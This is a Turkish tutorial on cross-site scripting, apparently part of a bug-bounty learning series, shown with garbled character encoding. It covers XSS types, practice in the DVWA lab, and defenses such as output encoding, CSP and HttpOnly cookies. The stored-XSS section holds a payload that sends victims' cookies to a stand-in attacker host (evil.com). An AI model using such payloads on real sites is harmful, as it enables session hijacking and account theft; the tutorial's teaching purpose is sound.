### 3. AdÄ±m: Cross-Site Scripting (XSS) â€“ TarayÄ±cÄ±nÄ±n ZaaflarÄ±nÄ± Kullanmak

Web gÃ¼venliÄŸinde sÄ±kÃ§a karÅŸÄ±laÅŸÄ±lan aÃ§Ä±klarÄ±n bir diÄŸeri de **Cross-Site Scripting (XSS)**. Bu aÃ§Ä±k, saldÄ±rganlarÄ±n bir web uygulamasÄ±na zararlÄ± JavaScript kodlarÄ±nÄ± enjekte ederek diÄŸer kullanÄ±cÄ±larÄ±n tarayÄ±cÄ±larÄ±nÄ± manipÃ¼le etmesine dayanÄ±r. Bu durum hem kullanÄ±cÄ±yÄ± hem de uygulamanÄ±n itibarÄ±nÄ± ciddi ÅŸekilde tehdit eder.

Hadi XSSâ€™i anlamaya ve sÃ¶mÃ¼rmeye baÅŸlayalÄ±m. ğŸ‘¾

---

### 3.1 XSS Nedir?

XSS, temelde bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r ve bir saldÄ±rganÄ±n uygulamanÄ±n istemci tarafÄ±nda (tarayÄ±cÄ±da) zararlÄ± komutlar Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r. Ã–rneÄŸin, bir yorum kutusuna aÅŸaÄŸÄ±daki gibi bir kod yazÄ±lÄ±rsa:

```html
<script>alert('XSS AÃ§Ä±ÄŸÄ±!');</script>
```

Bu kod, diÄŸer kullanÄ±cÄ±larÄ±n tarayÄ±cÄ±sÄ±nda Ã§alÄ±ÅŸabilir ve onlarÄ±n oturum bilgileri, Ã§erezleri veya diÄŸer hassas verilerini Ã§almaya olanak saÄŸlar.

---

### 3.2 XSS TÃ¼rleri

XSSâ€™i daha iyi anlamak iÃ§in tÃ¼rlerine bakalÄ±m:

#### **1. Stored XSS (DepolanmÄ±ÅŸ XSS)**
ZararlÄ± kod, kalÄ±cÄ± olarak veritabanÄ±nda saklanÄ±r ve her seferinde diÄŸer kullanÄ±cÄ±lara gÃ¶nderilir. Ã–rneÄŸin:

- Bir yorum sistemine ÅŸu kod yazÄ±lÄ±r:
    ```html
    <script>document.location='http://evil.com?cookie='+document.cookie;</script>
    ```
- DiÄŸer kullanÄ±cÄ±lar bu yorumu gÃ¶rÃ¼ntÃ¼lediÄŸinde tarayÄ±cÄ±larÄ± zararlÄ± koda maruz kalÄ±r.

#### **2. Reflected XSS (YansÄ±yan XSS)**
ZararlÄ± kod, uygulamadan hemen geri dÃ¶ner ve genelde URLâ€™de taÅŸÄ±nÄ±r. Ã–rnek:

```html
http://example.com/search?q=<script>alert('XSS')</script>
```

KullanÄ±cÄ± bu linke tÄ±kladÄ±ÄŸÄ±nda kod tarayÄ±cÄ±da Ã§alÄ±ÅŸÄ±r.

#### **3. DOM-Based XSS**
Bu tÃ¼rde, saldÄ±rÄ± doÄŸrudan tarayÄ±cÄ±da Ã§alÄ±ÅŸÄ±r ve veriler DOM manipÃ¼lasyonu ile enjekte edilir. Ã–rneÄŸin:

```javascript
document.write(location.hash);
```

URL ÅŸu ÅŸekilde olursa:

```html
http://example.com/#<script>alert('XSS')</script>
```

Kod tarayÄ±cÄ±da Ã§alÄ±ÅŸÄ±r.

---

### 3.3 Pratik: XSS AÃ§Ä±klarÄ±nÄ± Anlamak ve Denemek

#### **AdÄ±m 1: Stored XSS Testi**
DVWAâ€™da XSS seviyesini **Low** olarak ayarla ve yorum kutusuna ÅŸu kodu yaz:

```html
<script>alert('Stored XSS Testi!');</script>
```

- Bu kod kaydedilir ve her gÃ¶rÃ¼ntÃ¼lendiÄŸinde bir `alert` penceresi aÃ§Ä±lÄ±r.
- Åimdi, XSSâ€™in nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± gÃ¶zlemle.

#### **AdÄ±m 2: Reflected XSS Testi**
DVWAâ€™daki bir arama formuna ÅŸu kodu gir:

```html
<script>alert('Reflected XSS Testi!');</script>
```

- Kod tarayÄ±cÄ±ya geri dÃ¶ndÃ¼ÄŸÃ¼nde Ã§alÄ±ÅŸÄ±r. Bu, XSSâ€™in yansÄ±yan formudur.

#### **AdÄ±m 3: DOM-Based XSS Testi**
Bir form veya giriÅŸ alanÄ±nda `document.write` kullanan bir iÅŸlev varsa ÅŸu kodu deneyebilirsin:

```html
#<script>alert('DOM XSS Testi!');</script>
```

- EÄŸer DOM manipÃ¼lasyonu dÃ¼zgÃ¼n ÅŸekilde filtrelenmediyse, tarayÄ±cÄ± bu kodu Ã§alÄ±ÅŸtÄ±rÄ±r.

---

### 3.4 XSSâ€™e KarÅŸÄ± Savunma Teknikleri

XSS aÃ§Ä±klarÄ±nÄ± Ã¶nlemek iÃ§in ÅŸu yÃ¶ntemleri kullanabilirsin:

#### **1. Output Encoding**
KullanÄ±cÄ±nÄ±n verdiÄŸi veriyi tarayÄ±cÄ±da iÅŸlenmeden Ã¶nce gÃ¼venli hale getir. Ã–rneÄŸin, `"<script>"` gibi bir girdi ÅŸu ÅŸekilde encode edilmelidir:

```html
&lt;script&gt;
```

#### **2. Input Validation**
Form girdilerini kontrol et ve yalnÄ±zca beklenen veri tÃ¼rlerini kabul et.

#### **3. Content Security Policy (CSP)**
CSP, tarayÄ±cÄ±ya hangi kaynaklarÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±na izin verileceÄŸini sÃ¶yler. Ã–rneÄŸin:

```http
Content-Security-Policy: script-src 'self';
```

Bu politika, yalnÄ±zca aynÄ± alan adÄ±ndan gelen scriptâ€™lere izin verir.

#### **4. HttpOnly Ã‡erezler**
Ã‡erezlerin JavaScript tarafÄ±ndan eriÅŸilmesini engelle:

```http
Set-Cookie: sessionid=abc123; HttpOnly;
```

---

### 3.5 XSS AÃ§Ä±klarÄ±ndan Ders Ã‡Ä±karmak

XSS, kÃ¼Ã§Ã¼k bir aÃ§Ä±k gibi gÃ¶rÃ¼nse de saldÄ±rganlara bÃ¼yÃ¼k bir gÃ¼Ã§ verir. SaldÄ±rganlar, oturum Ã§erezlerini Ã§alarak kullanÄ±cÄ±nÄ±n oturumunu ele geÃ§irebilir, kimlik avÄ± saldÄ±rÄ±larÄ± yapabilir veya zararlÄ± iÃ§erikler yayabilir.

Pratik yaparken ÅŸunu unutma:  
Her zaman bir saldÄ±rganÄ±n gÃ¶zÃ¼nden bak, ancak Ã¶ÄŸrendiÄŸin teknikleri yalnÄ±zca etik ve eÄŸitim amaÃ§lÄ± kullan.

---

### 3.6 KapanÄ±ÅŸ

XSS, hem anlamasÄ± hem de sÃ¶mÃ¼rmesi kolay bir aÃ§Ä±k. Bu nedenle sÄ±kÃ§a karÅŸÄ±mÄ±za Ã§Ä±kar. Bug bounty avcÄ±sÄ± olmak isteyen biri iÃ§in XSS aÃ§Ä±klarÄ±nÄ± tespit edip raporlamak bÃ¼yÃ¼k bir fÄ±rsattÄ±r. Bir sonraki adÄ±mda, **Broken Authentication** konusuna odaklanabiliriz. HazÄ±rsan devam edelim! ğŸ˜Š
